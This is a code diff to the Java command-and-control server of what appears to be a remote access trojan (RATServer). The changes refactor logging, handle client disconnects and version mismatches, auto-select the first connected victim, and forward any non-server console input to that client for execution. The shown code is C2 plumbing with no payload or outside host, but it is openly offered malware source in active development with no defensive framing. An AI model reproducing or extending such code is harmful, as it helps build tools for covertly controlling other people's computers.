@@ -1,5 +1,6 @@
 package main.java.rat.server;
 
+import main.java.Main;
 import main.java.rat.Environment;
 import main.java.rat.command.ClientCommand;
 import main.java.rat.command.Command;
@@ -21,16 +22,18 @@ public class RATServer extends AbstractSocketServer implements Environment {
     private CommandHandler commandHandler;
     private CommandHandler clientCommandsHandler;
     private int lastId = 0;
+    private StringLogger logger;
 
     public RATServer(int port) {
         super(port);
-        commandHandler = new CommandHandler(System.out::println, this, ServerCommand.getAllServerCommands());
-        clientCommandsHandler = new CommandHandler(System.out::println, ClientCommand.getAllClientCommands());
+        logger = this::log;
+        commandHandler = new CommandHandler(logger, this, ServerCommand.getAllServerCommands());
+        clientCommandsHandler = new CommandHandler(logger, ClientCommand.getAllClientCommands());
     }
 
     @Override
     void serverStarted() {
-        System.out.println("Started server at port "+this.port
+        logger.log("[server] Started server at port "+this.port
                 +" and waiting for connections...");
         listenToConsoleCommands();
     }
@@ -42,9 +45,9 @@ public class RATServer extends AbstractSocketServer implements Environment {
         new Thread(() -> {
             while (this.started) {
                 String consoleCommand = console.nextLine();
-                if(!commandHandler.commandExists(consoleCommand) && clientCommandsHandler.commandExists(consoleCommand)) {
+                if(!commandHandler.commandExists(consoleCommand)) {
                     if(connectedClient == null) {
-                        System.out.println("Please connect to a client first to execute a client command");
+                        logger.log("Please connect to a client first to execute a client command");
                     } else {
                         connectedClient.sendCommand(consoleCommand);
                     }
@@ -63,30 +66,42 @@ public class RATServer extends AbstractSocketServer implements Environment {
                 outputStream,
                 inputStream
           );
-        RATConnectedClient client = new RATConnectedClient(lastId, handler, this);
+        RATConnectedClient client = new RATConnectedClient(this::log, lastId, handler, this);
         clientList.add(client);
         lastId++;
     }
 
-    public void clientDisconnected(RATConnectedClient ratConnectedClient) {
-        System.out.println("[server] client disconnected");
+    public void log(String message) {
+        System.out.println(message);
     }
 
-    public void incorrectSecret(RATConnectedClient ratConnectedClient) {
-        System.out.println("Client ("+ratConnectedClient.getId()+") tried to connect with incorrect secret, disconnecting the client...");
-        ratConnectedClient.disconnected();
+    public void clientDisconnected(RATConnectedClient client) {
+        logger.log("[server] '"+client.getFullName()+"' disconnected");
+        clientList.remove(client);
     }
 
-    public void unknownInitError(RATConnectedClient ratConnectedClient, Exception e) {
-        System.out.println("Unknown error occurred while performing init, disconnecting the client("+ratConnectedClient.getId()+")...");
-        System.out.println("Exception that was produced:");
+    public void incorrectSecret(RATConnectedClient client) {
+        logger.log("[server] Client ("+client.getId()+") tried to connect with incorrect secret, disconnecting the client...");
+        client.disconnected();
+    }
+
+    public void unknownInitError(RATConnectedClient client, Exception e) {
+        logger.log("[server] Unknown error occurred while performing init, disconnecting the client("+client.getId()+")...");
+        logger.log("[server] Exception that was produced:");
         e.printStackTrace();
-        ratConnectedClient.disconnected();
+        client.disconnected();
     }
 
-    public void successInit(RATConnectedClient ratConnectedClient, String version) {
-        System.out.println(ratConnectedClient.getFullName()+" connected");
-        //System.out.println(ratConnectedClient.getFormattedComputerInfo());
+    public void successInit(RATConnectedClient client, String version) {
+        logger.log("[server] "+client.getFullName()+" connected");
+        if(!version.equals(Main.VERSION)) {
+            logger.log("[server] WARNING the connected client version is not the same as this version, " +
+                    "client: " + version+", this version: " + Main.VERSION);
+        }
+        if(this.clientList.size() == 1) {
+            logger.log("[server] default connected to "+client.getFullName());
+            this.connectedClient = client;
+        }
     }
 
     public RATConnectedClient getClientFromId(int id) {
